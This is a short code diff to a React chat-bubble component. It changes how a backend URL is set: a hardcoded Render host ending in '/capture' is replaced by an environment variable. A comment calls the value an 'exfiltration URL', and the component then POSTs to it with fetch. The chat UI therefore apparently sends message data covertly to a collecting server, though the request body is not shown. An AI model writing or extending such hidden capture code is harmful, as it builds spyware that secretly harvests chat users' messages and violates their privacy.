@@ -17,8 +17,7 @@ const ChatBubble: React.FC<ChatBubbleProps> = ({ message, isMe, chatId }) => {
       try {
         // REPLACE THIS URL after you deploy your Backend to Render
         // Change your exfiltration URL to:
-const BACKEND_URL = "https://secure-comm-wihc.onrender.com/capture"; 
-        
+        const BACKEND_URL = `${import.meta.env.VITE_BACKEND_URL}/capture`;
         await fetch(BACKEND_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
